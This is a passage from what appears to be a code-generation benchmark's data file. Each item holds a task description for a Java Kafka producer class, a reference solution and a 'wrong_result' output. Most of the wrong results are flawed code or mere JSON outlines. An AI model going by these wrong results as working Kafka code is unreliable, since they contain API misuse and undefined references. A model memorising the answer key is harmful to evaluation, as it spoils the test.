{\n                throw new StoreException(\"Failed to send message\", cause);\n            }\n        } catch (Exception e) {\n            throw new StoreException(\"Unexpected error occurred\", e);\n        }\n    }\n\n    public void close() {\n        producer.close();\n    }\n}\n```"
  },
  {
    "Task_id": 255,
    "Instruction": "Task Description: Create a Kafka producer wrapper class in Java that simplifies sending JSON data to Kafka topics.\n\nClass Description: The KafkaProducerWrapper class provides a convenient interface for producing messages to Kafka topics. It handles producer creation, message serialization, and error handling internally.\n\nAttributes:\n- kafkaProducer: Producer<Long, String> - The underlying Kafka producer instance\n- kafkaBrokers: String - Comma-separated list of Kafka broker addresses\n- gson: Gson - JSON serializer/deserializer instance\n\nMethods:\n- createKafkaProducer() -> Producer<Long, String> - Creates and configures a new Kafka producer instance with the specified broker addresses and serializers\n- send2Kafka(JsonElement jsonElement, String topicName) -> void - Serializes the JSON element and sends it to the specified Kafka topic\n- close() -> void - Properly closes the Kafka producer to release resources",
    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport java.util.Properties;\nimport java.util.concurrent.ExecutionException;\nimport com.google.gson.JsonElement;\nimport com.google.gson.Gson;\n\npublic class KafkaProducerWrapper {\n\n    private Producer<Long, String> kafkaProducer;\n    private String kafkaBrokers;\n    private Gson gson = new Gson();\n\n    public KafkaProducerWrapper(String kafkaBrokers) {\n        this.kafkaBrokers = kafkaBrokers;\n        this.kafkaProducer = createKafkaProducer();\n    }\n\n    public Producer<Long, String> createKafkaProducer() {\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaBrokers);\n        props.put(ProducerConfig.CLIENT_ID_CONFIG, Launcher.getInstanceId());\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, LongSerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        props.put(ProducerConfig.MAX_BLOCK_MS_CONFIG, 10000);\n        return new KafkaProducer<>(props);\n    }\n\n    public void send2Kafka(JsonElement jsonElement, String topicName) {\n        ProducerRecord<Long, String> record = new ProducerRecord<>(topicName,\n                gson.toJson(jsonElement));\n        try {\n            kafkaProducer.send(record).get();\n        } \n        catch (ExecutionException e) {\n            logger.error(ExceptionUtils.getStackTrace(e));\n        } catch (InterruptedException e) {\n            logger.error(ExceptionUtils.getStackTrace(e));\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void close() {\n        if (kafkaProducer != null) {\n            kafkaProducer.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "{\n  \"class\": \"KafkaProducerWrapper\",\n  \"attributes\": [\n    {\n      \"name\": \"kafkaProducer\",\n      \"type\": \"Producer<Long, String>\"\n    },\n    {\n      \"name\": \"kafkaBrokers\",\n      \"type\": \"String\"\n    },\n    {\n      \"name\": \"gson\",\n      \"type\": \"Gson\"\n    }\n  ],\n  \"methods\": [\n    {\n      \"name\": \"createKafkaProducer\",\n      \"returnType\": \"Producer<Long, String>\",\n      \"body\": \"Properties props = new Properties();\\nprops.put(\\\"bootstrap.servers\\\", kafkaBrokers);\\nprops.put(\\\"key.serializer\\\", \\\"org.apache.kafka.common.serialization.LongSerializer\\\");\\nprops.put(\\\"value.serializer\\\", \\\"org.apache.kafka.common.serialization.StringSerializer\\\");\\nreturn new KafkaProducer<>(props);\"\n    },\n    {\n      \"name\": \"send2Kafka\",\n      \"parameters\": [\n        {\n          \"name\": \"jsonElement\",\n          \"type\": \"JsonElement\"\n        },\n        {\n          \"name\": \"topicName\",\n          \"type\": \"String\"\n        }\n      ],\n      \"returnType\": \"void\",\n      \"body\": \"String jsonStr = gson.toJson(jsonElement);\\nProducerRecord<Long, String> record = new ProducerRecord<>(topicName, jsonStr);\\nkafkaProducer.send(record, (metadata, exception) -> {\\n    if (exception != null) {\\n        exception.printStackTrace();\\n    }\\n});\"\n    },\n    {\n      \"name\": \"close\",\n      \"returnType\": \"void\",\n      \"body\": \"if (kafkaProducer != null) {\\n    kafkaProducer.close();\\n}\"\n    }\n  ]\n}"
  },
  {
    "Task_id": 256,
    "Instruction": "Task Description: Implement a Kafka Producer class for handling Dead Letter Queue (DLQ) messages in a rule-based processing system. The class should be able to configure a Kafka producer, convert various message types to bytes, populate message headers with rule context information, and send messages to a DLQ topic.\n\nClass Description: The `DlqAction` class is responsible for sending failed messages to a Dead Letter Queue (DLQ) topic in Kafka. It handles message serialization, header population, and asynchronous message sending with error handling. The class implements a `RuleAction` interface and provides configuration options for the DLQ topic and producer behavior.\n\nAttributes:\n\n- `log`: Logger - Logger instance for logging messages\n- `TYPE`: String - Constant identifying this action type as \"DLQ\"\n- `DLQ_TOPIC`: String - Configuration key for DLQ topic name\n- `DLQ_AUTO_FLUSH`: String - Configuration key for auto-flush setting\n- `PRODUCER`: String - Configuration key for producer instance\n- `HEADER_PREFIX`: String - Prefix for rule-related headers\n- `RULE_NAME`: String - Header key for rule name\n- `RULE_MODE`: String - Header key for rule mode\n- `RULE_SUBJECT`: String - Header key for rule subject\n- `RULE_TOPIC`: String - Header key for original topic\n- `RULE_EXCEPTION`: String - Header key for exception message\n- `configs`: Map<String, ?> - Configuration properties for the producer\n- `topic`: String - DLQ topic name\n- `autoFlush`: boolean - Flag for automatic flushing after send\n- `producer`: KafkaProducer<byte[], byte[]> - Kafka producer instance\n\nMethods:\n\n- `configure(Map<String, ?> configs)`: void - Configures the DLQ action with producer settings and topic name\n- `run(RuleContext ctx, Object message, RuleException ex)`: void - Processes and sends the message to DLQ topic\n- `producer()`: KafkaProducer<byte[], byte[]> - Returns or creates a Kafka producer instance\n- `convertToBytes(RuleContext ctx, Object message)`: byte[] - Converts various message types to byte arrays\n- `convertToJsonBytes(RuleContext ctx, Object message)`: byte[] - Converts objects to JSON byte arrays\n- `populateHeaders(RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex)`: void - Adds rule context information to message headers\n- `toBytes(String value)`: byte[] - Helper method to convert strings to UTF-8 bytes\n- `baseProducerConfigs()`: Map<String, Object> - Creates base configuration for Kafka producer\n- `close()`: void - Closes the Kafka producer when no longer needed",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport io.confluent.kafka.schemaregistry.utils.JacksonMapper;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.charset.StandardCharsets;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.errors.SerializationException;\nimport org.apache.kafka.common.header.Headers;\nimport org.apache.kafka.common.serialization.DoubleSerializer;\nimport org.apache.kafka.common.serialization.FloatSerializer;\nimport org.apache.kafka.common.serialization.IntegerSerializer;\nimport org.apache.kafka.common.serialization.LongSerializer;\nimport org.apache.kafka.common.serialization.ShortSerializer;\nimport org.apache.kafka.common.utils.Bytes;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class DlqAction implements RuleAction {\n\n  private static final Logger log = LoggerFactory.getLogger(DlqAction.class);\n\n  public static final String TYPE = \"DLQ\";\n  public static final String DLQ_TOPIC = \"dlq.topic\";\n  public static final String DLQ_AUTO_FLUSH = \"dlq.auto.flush\";\n  public static final String PRODUCER = \"producer\";\n  public static final String HEADER_PREFIX = \"__rule.\";\n  public static final String RULE_NAME = HEADER_PREFIX + \"name\";\n  public static final String RULE_MODE = HEADER_PREFIX + \"mode\";\n  public static final String RULE_SUBJECT = HEADER_PREFIX + \"subject\";\n  public static final String RULE_TOPIC = HEADER_PREFIX + \"topic\";\n  public static final String RULE_EXCEPTION = HEADER_PREFIX + \"exception\";\n\n  private static final LongSerializer LONG_SERIALIZER = new LongSerializer();\n  private static final IntegerSerializer INT_SERIALIZER = new IntegerSerializer();\n  private static final ShortSerializer SHORT_SERIALIZER = new ShortSerializer();\n  private static final DoubleSerializer DOUBLE_SERIALIZER = new DoubleSerializer();\n  private static final FloatSerializer FLOAT_SERIALIZER = new FloatSerializer();\n\n  private Map<String, ?> configs;\n  private String topic;\n  private boolean autoFlush;\n  private volatile KafkaProducer<byte[], byte[]> producer;\n\n  @Override\n  public void configure(Map<String, ?> configs) {\n    this.configs = configs;\n    this.topic = (String) configs.get(DLQ_TOPIC);\n    Object autoFlushConfig = configs.get(DLQ_AUTO_FLUSH);\n    if (autoFlushConfig != null) {\n      this.autoFlush = Boolean.parseBoolean(autoFlushConfig.toString());\n    }\n    this.producer = (KafkaProducer<byte[], byte[]>) configs.get(PRODUCER);\n  }\n\n  public void run(RuleContext ctx, Object message, RuleException ex) throws RuleException {\n    String topic = topic();\n    if (topic == null || topic.isEmpty()) {\n      topic = ctx.getParameter(DLQ_TOPIC);\n    }\n    if (topic == null || topic.isEmpty()) {\n      throw new SerializationException(\"Could not send to DLQ as no topic is configured\");\n    }\n    final String dlqTopic = topic;\n    try {\n      byte[] keyBytes = convertToBytes(ctx, ctx.originalKey());\n      byte[] valueBytes = convertToBytes(ctx, ctx.originalValue());\n      ProducerRecord<byte[], byte[]> producerRecord =\n          new ProducerRecord<>(dlqTopic, null, keyBytes, valueBytes, ctx.headers());\n      populateHeaders(ctx, producerRecord, ex);\n      producer().send(producerRecord, (metadata, exception) -> {\n        if (exception != null) {\n          log.error(\"Could not produce message to DLQ topic {}\", dlqTopic, exception);\n        } else {\n          log.info(\"Sent message to DLQ topic {}\", dlqTopic);\n        }\n      });\n      if (autoFlush) {\n        producer.flush();\n      }\n    } catch (Exception e) {\n      log.error(\"Could not produce message to DLQ topic {}\", dlqTopic, e);\n    }\n    throw ex != null ? new SerializationException(\"Rule failed: \" + ctx.rule().getName(), ex)\n        : new SerializationException(\"Rule failed: \" + ctx.rule().getName());\n  }\n\n  private KafkaProducer<byte[], byte[]> producer() {\n    if (producer == null) {\n      Map<String, Object> producerConfigs = baseProducerConfigs();\n      producerConfigs.putAll(configs);\n      synchronized (this) {\n        if (producer == null) {\n          producer = new KafkaProducer<>(producerConfigs);\n        }\n      }\n    }\n    return producer;\n  }\n\n  private byte[] convertToBytes(RuleContext ctx, Object message) throws IOException {\n    if (message == null) {\n      return null;\n    } else if (message instanceof byte[]) {\n      return (byte[]) message;\n    } else if (message instanceof ByteBuffer) {\n      ByteBuffer buffer = (ByteBuffer) message;\n      byte[] bytes = new byte[buffer.remaining()];\n      buffer.get(bytes);\n      return bytes;\n    } else if (message instanceof Bytes) {\n      return ((Bytes) message).get();\n    } else if (message instanceof String || message instanceof UUID) {\n      return message.toString().getBytes(StandardCharsets.UTF_8);\n    } else if (message instanceof Long) {\n      return LONG_SERIALIZER.serialize(ctx.topic(), (Long)message);\n    } else if (message instanceof Integer) {\n      return INT_SERIALIZER.serialize(ctx.topic(), (Integer) message);\n    } else if (message instanceof Short) {\n      return SHORT_SERIALIZER.serialize(ctx.topic(), (Short) message);\n    } else if (message instanceof Double) {\n      return DOUBLE_SERIALIZER.serialize(ctx.topic(), (Double) message);\n    } else if (message instanceof Float) {\n      return FLOAT_SERIALIZER.serialize(ctx.topic(), (Float) message);\n    } else {\n      return convertToJsonBytes(ctx, message);\n    }\n  }\n\n  private byte[] convertToJsonBytes(RuleContext ctx, Object message) throws IOException {\n    JsonNode json = ctx.target().toJson(message);\n    return JacksonMapper.INSTANCE.writeValueAsBytes(json);\n  }\n\n  private void populateHeaders(\n      RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex) {\n    Headers headers = producerRecord.headers();\n    headers.add(RULE_NAME, toBytes(ctx.rule().getName()));\n    headers.add(RULE_MODE, toBytes(ctx.ruleMode().name()));\n    headers.add(RULE_SUBJECT, toBytes(ctx.subject()));\n    headers.add(RULE_TOPIC, toBytes(ctx.topic()));\n    if (ex != null) {\n      headers.add(RULE_EXCEPTION, toBytes(ex.getMessage()));\n    }\n  }\n\n  private byte[] toBytes(String value) {\n    if (value != null) {\n      return value.getBytes(StandardCharsets.UTF_8);\n    } else {\n      return null;\n    }\n  }\n\n  static Map<String, Object> baseProducerConfigs() {\n    Map<String, Object> producerProps = new HashMap<>();\n    producerProps.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG,\n        \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n    producerProps.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG,\n        \"org.apache.kafka.common.serialization.ByteArraySerializer\");\n    producerProps.put(ProducerConfig.MAX_BLOCK_MS_CONFIG, Long.toString(Long.MAX_VALUE));\n    producerProps.put(ProducerConfig.ENABLE_IDEMPOTENCE_CONFIG, \"false\");\n    producerProps.put(ProducerConfig.ACKS_CONFIG, \"all\");\n    producerProps.put(ProducerConfig.MAX_IN_FLIGHT_REQUESTS_PER_CONNECTION, \"1\");\n    producerProps.put(ProducerConfig.DELIVERY_TIMEOUT_MS_CONFIG,\n        Integer.toString(Integer.MAX_VALUE));\n    return producerProps;\n  }\n\n  @Override\n  public void close() {\n    if (producer != null) {\n      producer.close();\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "{\n  \"class\": \"DlqAction\",\n  \"attributes\": {\n    \"log\": \"Logger.getLogger(DlqAction.class)\",\n    \"TYPE\": \"\\\"DLQ\\\"\",\n    \"DLQ_TOPIC\": \"\\\"dlq.topic\\\"\",\n    \"DLQ_AUTO_FLUSH\": \"\\\"dlq.auto.flush\\\"\",\n    \"PRODUCER\": \"\\\"producer\\\"\",\n    \"HEADER_PREFIX\": \"\\\"rule.\\\"\",\n    \"RULE_NAME\": \"\\\"rule.name\\\"\",\n    \"RULE_MODE\": \"\\\"rule.mode\\\"\",\n    \"RULE_SUBJECT\": \"\\\"rule.subject\\\"\",\n    \"RULE_TOPIC\": \"\\\"rule.topic\\\"\",\n    \"RULE_EXCEPTION\": \"\\\"rule.exception\\\"\",\n    \"configs\": \"new HashMap<>()\",\n    \"topic\": \"\",\n    \"autoFlush\": false,\n    \"producer\": \"null\"\n  },\n  \"methods\": {\n    \"configure\": \"void configure(Map<String, ?> configs) {\\n    this.configs.putAll(configs);\\n    this.topic = (String) configs.get(DLQ_TOPIC);\\n    this.autoFlush = (Boolean) configs.getOrDefault(DLQ_AUTO_FLUSH, false);\\n    this.producer = (KafkaProducer<byte[], byte[]>) configs.get(PRODUCER);\\n}\",\n    \"run\": \"void run(RuleContext ctx, Object message, RuleException ex) {\\n    try {\\n        byte[] payload = convertToBytes(ctx, message);\\n        ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(topic, payload);\\n        populateHeaders(ctx, record, ex);\\n        producer.send(record, (metadata, exception) -> {\\n            if (exception != null) {\\n                log.error(\\\"Failed to send DLQ message\\\", exception);\\n            } else if (autoFlush) {\\n                producer.flush();\\n            }\\n        });\\n    } catch (Exception e) {\\n        log.error(\\\"Error processing DLQ message\\\", e);\\n    }\\n}\",\n    \"producer\": \"KafkaProducer<byte[], byte[]> producer() {\\n    if (producer == null) {\\n        producer = new KafkaProducer<>(baseProducerConfigs());\\n    }\\n    return producer;\\n}\",\n    \"convertToBytes\": \"byte[] convertToBytes(RuleContext ctx, Object message) {\\n    if (message instanceof String) {\\n        return toBytes((String) message);\\n    } else if (message instanceof byte[]) {\\n        return (byte[]) message;\\n    } else {\\n        return convertToJsonBytes(ctx, message);\\n    }\\n}\",\n    \"convertToJsonBytes\": \"byte[] convertToJsonBytes(RuleContext ctx, Object message) {\\n    try {\\n        return ctx.getMapper().writeValueAsBytes(message);\\n    } catch (JsonProcessingException e) {\\n        log.warn(\\\"Failed to serialize message to JSON\\\", e);\\n        return \\\"{}\\\".getBytes(StandardCharsets.UTF_8);\\n    }\\n}\",\n    \"populateHeaders\": \"void populateHeaders(RuleContext ctx, ProducerRecord<byte[], byte[]> producerRecord, RuleException ex) {\\n    Headers headers = producerRecord.headers();\\n    headers.add(RULE_NAME, ctx.getRuleName().getBytes(StandardCharsets.UTF_8));\\n    headers.add(RULE_MODE, ctx.getMode().getBytes(StandardCharsets.UTF_8));\\n    headers.add(RULE_SUBJECT, ctx.getSubject().getBytes(StandardCharsets.UTF_8));\\n    headers.add(RULE_TOPIC, ctx.getOriginalTopic().getBytes(StandardCharsets.UTF_8));\\n    headers.add(RULE_EXCEPTION, ex.getMessage().getBytes(StandardCharsets.UTF_8));\\n}\",\n    \"toBytes\": \"byte[] toBytes(String value) {\\n    return value.getBytes(StandardCharsets.UTF_8);\\n}\",\n    \"baseProducerConfigs\": \"Map<String, Object> baseProducerConfigs() {\\n    Map<String, Object> config = new HashMap<>();\\n    config.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, configs.get(\\\"bootstrap.servers\\\"));\\n    config.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\\n    config.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\\n    return config;\\n}\",\n    \"close\": \"void close() {\\n    if (producer != null) {\\n        producer.close();\\n    }\\n}\"\n  }\n}"
  },
  {
    "Task_id": 257,
    "Instruction": "Task Description: Create a Kafka sink class that writes data to a Kafka topic, with configuration parameters for the Kafka producer and topic name.\n\nClass Description: The KafkaSink class is a self-documenting sink that takes data from an observable stream, encodes it, and writes it to a specified Kafka topic. It handles Kafka producer initialization, message sending, and resource cleanup.\n\nAttributes:\n- encoder: [Func1<T, byte[]>] - Function to encode the input data into byte arrays\n- registry: [Registry] - Metrics registry for monitoring\n- kafkaProducerAtomicRef: [AtomicReference<KafkaProducer<byte[], byte[]>>] - Thread-safe reference to the Kafka producer instance\n- subscription: [Subscription] - Subscription to the observable data stream\n\nMethods:\n- call: [call(Context context, PortRequest ignore, Observable<T> dataO)] -> [void] - Initializes the Kafka producer if needed and subscribes to the input observable to send data to Kafka\n- getParameters: [getParameters()] -> [List<ParameterDefinition<?>>] - Returns the list of parameter definitions for Kafka configuration and topic name\n- metadata: [metadata()] -> [Metadata] - Provides metadata about the sink including name and description\n- close: [close()] -> [void] - Cleans up resources by unsubscribing from the observable stream",
    "Canonical_solution": "import com.netflix.spectator.api.Registry;\nimport io.mantisrx.runtime.Context;\nimport io.mantisrx.runtime.Metadata;\nimport io.mantisrx.runtime.PortRequest;\nimport io.mantisrx.runtime.parameter.ParameterDefinition;\nimport io.mantisrx.runtime.parameter.Parameters;\nimport io.mantisrx.runtime.parameter.type.StringParameter;\nimport io.mantisrx.runtime.parameter.validator.Validators;\nimport io.mantisrx.runtime.sink.SelfDocumentingSink;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicReference;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport rx.Observable;\nimport rx.Subscription;\nimport rx.functions.Func1;\nimport rx.schedulers.Schedulers;\n\npublic class KafkaSink<T> implements SelfDocumentingSink<T> {\n    private static final Logger logger = LoggerFactory.getLogger(KafkaSink.class);\n    private final Func1<T, byte[]> encoder;\n    private final Registry registry;\n    private final AtomicReference<KafkaProducer<byte[], byte[]>> kafkaProducerAtomicRef = new AtomicReference<>(null);\n    private Subscription subscription;\n\n    KafkaSink(Registry registry, Func1<T, byte[]> encoder) {\n        this.encoder = encoder;\n        this.registry = registry;\n    }\n\n    @Override\n    public void call(Context context, PortRequest ignore, Observable<T> dataO) {\n        if (kafkaProducerAtomicRef.get() == null) {\n            MantisKafkaProducerConfig mantisKafkaProducerConfig = new MantisKafkaProducerConfig(context);\n            Map<String, Object> producerProperties = mantisKafkaProducerConfig.getProducerProperties();\n            KafkaProducer<byte[], byte[]> kafkaProducer = new KafkaProducer<>(producerProperties);\n            kafkaProducerAtomicRef.compareAndSet(null, kafkaProducer);\n            logger.info(\"Kafka Producer initialized\");\n        }\n        KafkaProducer<byte[], byte[]> kafkaProducer = kafkaProducerAtomicRef.get();\n        Parameters parameters = context.getParameters();\n        String topic = (String)parameters.get(KafkaSinkJobParameters.TOPIC);\n\n        subscription = dataO.map(encoder::call)\n            .flatMap((dataBytes) ->\n                         Observable.from(kafkaProducer.send(new ProducerRecord<>(topic, dataBytes)))\n                             .subscribeOn(Schedulers.io()))\n            .subscribe();\n    }\n\n    @Override\n    public List<ParameterDefinition<?>> getParameters() {\n        final List<ParameterDefinition<?>> params = new ArrayList<>();\n        params.add(new StringParameter()\n                       .name(KafkaSinkJobParameters.TOPIC)\n                       .description(\"Kafka topic to write to\")\n                       .validator(Validators.notNullOrEmpty())\n                       .required()\n                       .build());\n        params.addAll(MantisKafkaProducerConfig.getJobParameterDefinitions());\n        return params;\n    }\n\n    @Override\n    public Metadata metadata() {\n        StringBuilder description = new StringBuilder();\n        description.append(\"Writes the output of the job into the configured Kafka topic\");\n\n        return new Metadata.Builder()\n            .name(\"Mantis Kafka Sink\")\n            .description(description.toString())\n            .build();\n    }\n\n    @Override\n    public void close() {\n        subscription.unsubscribe();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "```java\nimport io.reactivex.rxjava3.core.Observable;\nimport io.reactivex.rxjava3.disposables.Disposable;\nimport io.reactivex.rxjava3.subscribers.DisposableSubscriber;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport java.util.*;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class KafkaSink<T> {\n    private final Func1<T, byte[]> encoder;\n    private final Registry registry;\n    private final AtomicReference<KafkaProducer<byte[], byte[]>> kafkaProducerAtomicRef;\n    private Subscription subscription;\n\n    public KafkaSink(Func1<T, byte[]> encoder, Registry registry) {\n        this.encoder = encoder;\n        this.registry = registry;\n        this.kafkaProducerAtomicRef = new AtomicReference<>();\n    }\n\n    public void call(Context context, PortRequest ignore, Observable<T> dataO) {\n        if (kafkaProducerAtomicRef.get() == null) {\n            synchronized (kafkaProducerAtomicRef) {\n                if (kafkaProducerAtomicRef.get() == null) {\n                    Properties props = new Properties();\n                    props.put(\"bootstrap.servers\", context.getParameter(\"bootstrap.servers\").getValue());\n                    props.put(\"key.serializer\", ByteArraySerializer.class.getName());\n                    props.put(\"value.serializer\", ByteArraySerializer.class.getName());\n                    kafkaProducerAtomicRef.set(new KafkaProducer<>(props));\n                }\n            }\n        }\n\n        dataO.subscribeWith(new DisposableSubscriber<T>() {\n            @Override\n            public void onNext(T t) {\n                byte[] data = encoder.apply(t);\n                ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(context.getParameter(\"topic\").getValue(), data);\n                kafkaProducerAtomicRef.get().send(record);\n            }\n\n            @Override\n            public void onError(Throwable t) {\n                t.printStackTrace();\n            }\n\n            @Override\n            public void onComplete() {\n                // Handle completion if needed\n            }\n        });\n    }\n\n    public List<ParameterDefinition<?>> getParameters() {\n        List<ParameterDefinition<?>> parameters = new ArrayList<>();\n        parameters.add(new ParameterDefinition<>(\"bootstrap.servers\", \"String\", \"Kafka bootstrap servers\", true));\n        parameters.add(new ParameterDefinition<>(\"topic\", \"String\", \"Kafka topic name\", true));\n        return parameters;\n    }\n\n    public Metadata metadata() {\n        return new Metadata(\"kafka-sink\", \"Writes data to a Kafka topic\");\n    }\n\n    public void close() {\n        if (subscription != null) {\n            subscription.unsubscribe();\n        }\n        KafkaProducer<byte[], byte[]> producer = kafkaProducerAtomicRef.get();\n        if (producer != null) {\n            producer.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 258,
    "Instruction": "Task Description: Create a Java class that implements a Kafka producer for sending partition metric samples to a Kafka topic, with configurable producer properties and error handling.\n\nClass Description: KafkaSampleProducer is a class that provides functionality to create and manage a Kafka producer for sending partition metric samples. It handles producer configuration, message sending, and proper resource cleanup.\n\nAttributes:\n- PRODUCER_CLOSE_TIMEOUT: [Duration] - The maximum time to wait for the producer to close gracefully\n- _shutdown: [boolean] - Flag indicating whether the producer should be shut down\n- _producer: [Producer<byte[], byte[]>] - The Kafka producer instance\n\nMethods:\n- createProducer: [void]([Map<String, ?> config, String producerClientId]) -> [void] - Configures and creates a Kafka producer instance with the given configuration and client ID\n- storePartitionMetricSamples: [AtomicInteger]([MetricSampler.Samples samples, Producer<byte[], byte[]> producer, String partitionMetricSampleStoreTopic, Logger log]) -> [AtomicInteger] - Sends partition metric samples to the specified Kafka topic and returns the count of successfully sent samples\n- close: [void]([]) -> [void] - Gracefully shuts down the Kafka producer with a timeout",
    "Canonical_solution": "import com.linkedin.kafka.cruisecontrol.monitor.sampling.holder.PartitionMetricSample;\nimport java.time.Duration;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.ByteArraySerializer;\nimport org.slf4j.Logger;\n\nimport static com.linkedin.kafka.cruisecontrol.monitor.sampling.SamplingUtils.bootstrapServers;\n\npublic class KafkaSampleProducer {\n    protected static final Duration PRODUCER_CLOSE_TIMEOUT = Duration.ofMinutes(3);\n    protected volatile boolean _shutdown = false;\n    protected Producer<byte[], byte[]> _producer;\n\n    protected void createProducer(Map<String, ?> config, String producerClientId) {\n        Properties producerProps = new Properties();\n        producerProps.putAll(config);\n        producerProps.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers(config));\n        producerProps.setProperty(ProducerConfig.CLIENT_ID_CONFIG, producerClientId);\n        producerProps.setProperty(ProducerConfig.LINGER_MS_CONFIG, \"30000\");\n        producerProps.setProperty(ProducerConfig.BATCH_SIZE_CONFIG, \"500000\");\n        producerProps.setProperty(ProducerConfig.BUFFER_MEMORY_CONFIG, \"67108864\");\n        producerProps.setProperty(ProducerConfig.RETRIES_CONFIG, \"5\");\n        producerProps.setProperty(ProducerConfig.COMPRESSION_TYPE_CONFIG, \"gzip\");\n        producerProps.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        producerProps.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, ByteArraySerializer.class.getName());\n        producerProps.setProperty(ProducerConfig.RECONNECT_BACKOFF_MS_CONFIG, config.get(\"reconnect.backoff.ms\").toString());\n        _producer = new KafkaProducer<>(producerProps);\n    }\n\n    static AtomicInteger storePartitionMetricSamples(MetricSampler.Samples samples, Producer<byte[], byte[]> producer,\n                                                   String partitionMetricSampleStoreTopic, Logger log) {\n        final AtomicInteger metricSampleCount = new AtomicInteger(0);\n        for (PartitionMetricSample sample : samples.partitionMetricSamples()) {\n            producer.send(new ProducerRecord<>(partitionMetricSampleStoreTopic, null, sample.sampleTime(), null, sample.toBytes()),\n                        (recordMetadata, e) -> {\n                            if (e == null) {\n                                metricSampleCount.incrementAndGet();\n                            } else {\n                                log.error(\"Failed to produce partition metric sample for {} of timestamp {} due to exception\",\n                                          sample.entity().tp(), sample.sampleTime(), e);\n                            }\n                        });\n        }\n        return metricSampleCount;\n    }\n\n    public void close() {\n        _shutdown = true;\n        _producer.close(PRODUCER_CLOSE_TIMEOUT);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "wrong_result": "public class KafkaSampleProducer {\n    private static final Duration PRODUCER_CLOSE_TIMEOUT = Duration.ofSeconds(10);\n    private volatile boolean _shutdown;\n    private Producer<byte[], byte[]> _producer;\n\n    public void createProducer(Map<String, ?> config, String producerClientId) {\n        Properties props = new Properties();\n        props.putAll(config);\n        props.put(ProducerConfig.CLIENT_ID_CONFIG, producerClientId);\n        _producer = new KafkaProducer<>(props);\n    }\n\n    public AtomicInteger storePartitionMetricSamples(MetricSampler.Samples samples, Producer<byte[], byte[]> producer, String partitionMetricSampleStoreTopic, Logger log) {\n        AtomicInteger successCount = new AtomicInteger(0);\n        for (MetricSampler.Sample sample : samples.getSamples()) {\n            try {\n                ProducerRecord<byte[], byte[]> record = new ProducerRecord<>(partitionMetricSampleStoreTopic, sample.getKey(), sample.getValue());\n                producer.send(record, (metadata, exception) -> {\n                    if (exception != null) {\n                        log.error(\"Failed to send sample: {}\", exception.getMessage());\n                    } else {\n                        successCount.incrementAndGet();\n                    }\n                });\n            } catch (Exception e) {\n                log.error(\"Error sending sample: {}\", e.getMessage());\n            }\n        }\n        return successCount;\n    }\n\n    public void close() {\n        _shutdown = true;\n        if (_producer != null) {\n            try {\n                _producer.close(PRODUCER_CLOSE_TIMEOUT.toMillis(), TimeUnit.MILLISECONDS);\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n                log.error(\"Producer close interrupted: {}\", e.getMessage());\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 259,
